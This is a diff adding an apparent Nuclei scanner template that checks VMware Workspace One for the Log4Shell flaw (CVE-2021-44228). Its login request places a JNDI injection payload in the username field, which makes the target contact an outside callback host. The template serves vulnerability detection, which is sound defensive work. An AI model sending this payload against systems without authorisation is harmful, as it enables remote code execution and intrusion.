@@ -1,0 +1,37 @@
+id: cve-2021-44228
+info:
+  name: VMware Workspace One log4j2 RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Various VMware products such as VMware Horizon, VMware vCenter Server, VMware HCX, VMware NSX-T Data Center, etc. are affected by the remote code execution vulnerability CVE-2021-44228. Attackers can use the vulnerability CVE-2021-44228 to cause remote code execution and control server permissions.
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 10.0
+    cve-id: CVE-2021-44228
+  tags: log4j,rce
+
+variables:
+  dnslog: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /SAAS/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        isJavascriptEnabled=true&areCookiesEnabled=true&dest=&guest=false&useragent=Windows+NT+10.0&attempts=0&userNameTextFieldReadonly=true&username=${jndi:ldap://{{dnslog}}}&userInput=31223&password=23123&userstoreDisplay=%E7%B3%BB%E7%BB%9F%E5%9F%9F&loginFormSubmit=%E7%99%BB%E5%BD%95
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: word
+        part: interactsh_request
+        words:
+          - "jndi:ldap"
